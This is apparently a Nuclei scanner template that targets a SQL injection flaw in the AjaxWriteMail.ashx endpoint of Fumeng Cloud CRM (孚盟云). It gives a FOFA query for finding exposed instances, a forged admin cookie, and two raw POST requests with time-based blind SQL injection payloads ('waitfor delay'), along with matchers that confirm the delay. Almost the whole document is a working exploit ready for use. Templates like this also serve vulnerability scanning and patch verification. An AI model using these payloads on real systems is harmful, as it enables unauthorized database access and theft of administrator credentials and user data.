id: fumeng-cloud-crm-ajaxwritemail-sqli
info:
  name: "孚盟云CRM AjaxWriteMail.ashx接口存在SQL注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="孚盟软件-孚盟云"
        上海孚盟软件有限公司作为外贸SaaS服务提供商，其孚盟云产品中的AjaxWriteMail.ashx接口存在SQL注入缺陷。攻击者可通过该漏洞执行恶意SQL语句，导致数据库敏感信息泄露（如管理员凭据及用户数据）。在特定权限条件下，可能进一步实现服务器端恶意代码部署，威胁系统完整性。
  tags: 孚盟云
http:
- raw:
  - |
    POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
    Host: {{Hostname}}
    Cookie: UserCookie={"empId":"admin","corpId": "1"}
    Content-Type: application/x-www-form-urlencoded

    method=updateLastedContactTable&mails=1'waitfor+delay'0:0:3'--+-
  - |
    POST /m/Dingding/Ajax/AjaxWriteMail.ashx HTTP/1.1
    Host: {{Hostname}}
    Cookie: UserCookie={"empId":"admin","corpId": "1"}
    Content-Type: application/x-www-form-urlencoded

    method=updateLastedContactTable&mails=1'waitfor+delay'0:0:8'--+-
  matchers:
  - type: dsl
    dsl:
    - duration_1>=3 && duration_1<=4
    - duration_2>=8 && duration_2<=9
    condition: and
